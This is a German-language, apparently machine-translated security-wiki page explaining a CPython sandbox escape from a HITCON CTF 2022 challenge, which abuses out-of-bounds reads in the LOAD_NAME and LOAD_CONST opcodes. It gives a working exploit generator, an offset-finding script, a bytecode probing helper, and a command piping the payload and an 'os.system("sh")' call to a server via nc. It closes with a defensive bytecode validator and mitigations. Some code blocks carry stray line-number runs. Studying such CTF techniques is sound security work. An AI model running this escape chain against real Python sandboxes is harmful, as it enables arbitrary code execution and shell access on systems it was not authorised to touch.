# LOAD_NAME / LOAD_CONST Opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

**Diese Informationen stammen** [**aus diesem Bericht**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Wir können die OOB-Read-Funktion im LOAD_NAME / LOAD_CONST Opcode nutzen, um ein Symbol im Speicher zu erhalten. Das bedeutet, dass wir Tricks wie `(a, b, c, ... hunderte von Symbolen ..., __getattribute__) if [] else [].__getattribute__(...)` verwenden, um ein Symbol (wie den Funktionsnamen) zu erhalten, das wir wollen.

Dann erstellen Sie einfach Ihren Exploit.

### Übersicht <a href="#overview-1" id="overview-1"></a>

Der Quellcode ist ziemlich kurz und enthält nur 4 Zeilen!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Sie können beliebigen Python-Code eingeben, und er wird in ein [Python-Code-Objekt](https://docs.python.org/3/c-api/code.html) kompiliert. Allerdings werden `co_consts` und `co_names` dieses Code-Objekts vor der Auswertung dieses Code-Objekts durch ein leeres Tupel ersetzt.

Auf diese Weise können alle Ausdrücke, die Konstanten (z. B. Zahlen, Strings usw.) oder Namen (z. B. Variablen, Funktionen) enthalten, letztendlich einen Segmentierungsfehler verursachen.

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Wie kommt es zu dem Segfault?

Lassen Sie uns mit einem einfachen Beispiel beginnen, `[a, b, c]` könnte in den folgenden Bytecode kompiliert werden.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Aber was passiert, wenn das `co_names` ein leeres Tupel wird? Der `LOAD_NAME 2` Opcode wird weiterhin ausgeführt und versucht, den Wert von der Speicheradresse zu lesen, von der er ursprünglich lesen sollte. Ja, das ist eine Out-of-Bound-Lese "Funktion".

Das grundlegende Konzept für die Lösung ist einfach. Einige Opcodes in CPython, wie `LOAD_NAME` und `LOAD_CONST`, sind anfällig (?) für OOB-Lesevorgänge.

Sie rufen ein Objekt vom Index `oparg` aus dem `consts` oder `names` Tupel ab (so werden `co_consts` und `co_names` im Hintergrund genannt). Wir können auf den folgenden kurzen Ausschnitt über `LOAD_CONST` verweisen, um zu sehen, was CPython tut, wenn es den `LOAD_CONST` Opcode verarbeitet.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
Auf diese Weise können wir die OOB-Funktion nutzen, um einen "Namen" von einem beliebigen Speicheroffset zu erhalten. Um sicherzustellen, welchen Namen er hat und was sein Offset ist, versuchen Sie einfach `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... Und Sie könnten etwas bei oparg > 700 finden. Sie können natürlich auch versuchen, gdb zu verwenden, um sich das Speicherlayout anzusehen, aber ich denke nicht, dass es einfacher wäre?

### Generating the Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Sobald wir diese nützlichen Offsets für Namen / Consts abgerufen haben, wie _bekommen_ wir einen Namen / Const von diesem Offset und verwenden ihn? Hier ist ein Trick für Sie:\
Angenommen, wir können einen `__getattribute__` Namen von Offset 5 (`LOAD_NAME 5`) mit `co_names=()` erhalten, dann machen Sie einfach Folgendes:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Beachten Sie, dass es nicht notwendig ist, es als `__getattribute__` zu benennen, Sie können es auch kürzer oder seltsamer benennen.

Sie können den Grund dafür verstehen, indem Sie einfach den Bytecode ansehen:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Beachten Sie, dass `LOAD_ATTR` auch den Namen aus `co_names` abruft. Python lädt Namen aus demselben Offset, wenn der Name gleich ist, sodass das zweite `__getattribute__` weiterhin von offset=5 geladen wird. Mit dieser Funktion können wir einen beliebigen Namen verwenden, sobald der Name im nahegelegenen Speicher vorhanden ist.

Für die Generierung von Zahlen sollte es trivial sein:

- 0: nicht \[\[]]
- 1: nicht \[]
- 2: (nicht \[]) + (nicht \[])
- ...

### Exploit-Skript <a href="#exploit-script-1" id="exploit-script-1"></a>

Ich habe keine Konstanten verwendet, da es eine Längenbeschränkung gibt.

Zuerst hier ein Skript, um diese Offsets der Namen zu finden.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
Und das Folgende dient zur Erstellung des echten Python-Exploits.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Es macht im Grunde die folgenden Dinge, für die Strings, die wir von der `__dir__`-Methode erhalten:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Versionshinweise und betroffene Opcodes (Python 3.11–3.13)

- CPython-Bytecode-Opcodes indizieren weiterhin in `co_consts` und `co_names` Tupel durch ganzzahlige Operanden. Wenn ein Angreifer diese Tupel leer (oder kleiner als der maximale Index, der vom Bytecode verwendet wird) zwingen kann, wird der Interpreter Speicher außerhalb der Grenzen für diesen Index lesen, was einen beliebigen PyObject-Zeiger aus dem nahen Speicher ergibt. Relevante Opcodes umfassen mindestens:
- `LOAD_CONST consti` → liest `co_consts[consti]`.
- `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → lesen Namen aus `co_names[...]` (für 3.11+ beachten Sie, dass `LOAD_ATTR`/`LOAD_GLOBAL` Flag-Bits im niedrigsten Bit speichern; der tatsächliche Index ist `namei >> 1`). Siehe die Disassembler-Dokumentation für genaue Semantik pro Version. [Python dis docs].
- Python 3.11+ führte adaptive/inline Caches ein, die versteckte `CACHE`-Einträge zwischen den Anweisungen hinzufügen. Dies ändert nicht das OOB-Primitiv; es bedeutet nur, dass Sie, wenn Sie Bytecode manuell erstellen, diese Cache-Einträge beim Erstellen von `co_code` berücksichtigen müssen.

Praktische Implikation: Die Technik auf dieser Seite funktioniert weiterhin auf CPython 3.11, 3.12 und 3.13, wenn Sie ein Code-Objekt kontrollieren können (z. B. über `CodeType.replace(...)`) und `co_consts`/`co_names` verkleinern.

### Schneller Scanner für nützliche OOB-Indizes (3.11+/3.12+ kompatibel)

Wenn Sie es vorziehen, interessante Objekte direkt aus Bytecode zu erkunden, anstatt aus hochrangigem Quellcode, können Sie minimale Code-Objekte generieren und Indizes brute-forcen. Der folgende Helfer fügt automatisch Inline-Caches ein, wenn nötig.
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Notizen
- Um stattdessen Namen zu prüfen, tauschen Sie `LOAD_CONST` gegen `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` aus und passen Sie Ihre Stack-Nutzung entsprechend an.
- Verwenden Sie `EXTENDED_ARG` oder mehrere Bytes von `arg`, um Indizes >255 zu erreichen, falls erforderlich. Wenn Sie mit `dis` wie oben arbeiten, steuern Sie nur das niedrige Byte; für größere Indizes erstellen Sie die Rohbytes selbst oder teilen den Angriff über mehrere Ladevorgänge auf.

### Minimaler Bytecode-Only RCE-Pattern (co_consts OOB → builtins → eval/input)

Sobald Sie einen `co_consts`-Index identifiziert haben, der auf das Builtins-Modul verweist, können Sie `eval(input())` ohne irgendwelche `co_names` rekonstruieren, indem Sie den Stack manipulieren:
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
Dieser Ansatz ist nützlich bei Herausforderungen, die Ihnen direkte Kontrolle über `co_code` geben, während `co_consts=()` und `co_names=()` erzwungen werden (z. B. BCTF 2024 “awpcode”). Er vermeidet Tricks auf Quellcode-Ebene und hält die Payload-Größe klein, indem er Bytecode-Stack-Operationen und Tupel-Builder nutzt.

### Defensive Überprüfungen und Milderungen für Sandboxes

Wenn Sie eine Python-“Sandbox” schreiben, die nicht vertrauenswürdigen Code kompiliert/bewertet oder Codeobjekte manipuliert, verlassen Sie sich nicht auf CPython, um die Grenzen der Tupelindizes, die von Bytecode verwendet werden, zu überprüfen. Validieren Sie stattdessen die Codeobjekte selbst, bevor Sie sie ausführen.

Praktischer Validator (verwirft OOB-Zugriff auf co_consts/co_names)
```python
import dis

def max_name_index(code):
max_idx = -1
for ins in dis.get_instructions(code):
if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
namei >>= 1
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname == "LOAD_CONST"] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Zusätzliche Milderungsansätze
- Erlaube keine willkürlichen `CodeType.replace(...)` bei nicht vertrauenswürdigen Eingaben oder füge strenge strukturelle Überprüfungen des resultierenden Codeobjekts hinzu.
- Ziehe in Betracht, nicht vertrauenswürdigen Code in einem separaten Prozess mit OS-Level-Sandboxing (seccomp, Jobobjekte, Container) auszuführen, anstatt auf CPython-Semantiken zu vertrauen.

## Referenzen

- Splitline’s HITCON CTF 2022 Bericht “V O I D” (Ursprung dieser Technik und hochrangige Exploit-Kette): https://blog.splitline.tw/hitcon-ctf-2022/
- Python Disassembler-Dokumentation (Indizes-Semantiken für LOAD_CONST/LOAD_NAME/etc. und 3.11+ `LOAD_ATTR`/`LOAD_GLOBAL` Niedrig-Bit-Flags): https://docs.python.org/3.13/library/dis.html
{{#include ../../../banners/hacktricks-training.md}}
